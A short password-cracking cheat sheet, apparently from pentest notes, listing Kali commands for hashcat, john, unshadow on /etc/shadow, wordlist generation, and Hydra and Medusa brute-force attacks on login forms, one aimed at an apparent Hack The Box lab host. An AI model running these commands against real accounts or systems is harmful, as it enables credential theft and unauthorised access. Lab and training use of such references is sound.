Chapter 7 - Cracking

> The time to crack a password is related to bit strength, which is a measure of the password's entropy and the details of how the password is stored. Most methods of password cracking require the computer to produce many candidate passwords, each of which is checked. One example is brute-force cracking, in which a computer tries every possible key or password until it succeeds. More common methods of password cracking, such as dictionary attacks, pattern checking, word list substitution, etc. attempt to reduce the number of trials required and will usually be attempted before brute force. Higher password bit strength exponentially increases the number of candidate passwords that must be checked, on average, to recover the password and reduces the likelihood that the password will be found in any cracking dictionary.
>
> _**— Wikipedia**_

looking for contributions to this section. Please DM me on [Twitter](https://twitter.com/dostoevskylabs)

#### Hash Identification

```
Kali> hash-identifier
> HASH64256BLOOBLAHHAHAHEHE
```

#### Decoding

```
Kali> echo"BASE64"| base64 -d
Kali> echo"d3 4d b3 3f"| xxd -r -ps
```

#### Wordlist Generation

###### Crunch

```
Kali>
 crunch 6 6 0123456789ABCDEF -o crunch.txt
```

###### CEWL

```
Kali> cewl www.wikipedia.com -m 6 -w passwords.txt
```

###### John

```
Kali> nano /etc/john/john.conf
Kali> john --wordlist=passwords.txt --rules --stdout > mutated
```

#### Hashcat

```
Kali> hashcat -m 400 -a 0 hash /usr/share/wordlists/rockyou.txt
Kali> oclHashcat64.bin -m 110 hash.txt ../wordlist.txt --force
```

#### Converting for John attacks

```
Kali> ssh2john file > newfile
Kali> unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

#### John

```
Kali> john crackfile --wordlist=/usr/share/wordlists/rockyou.txt
```

#### BruteForcing

###### Hydra

```
Kali> hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password" -V -I
```

###### Medusa

```
Kali> medusa -h $TARGET -u admin -P passwords.txt -M http -m DIR:/admin -T 10
```



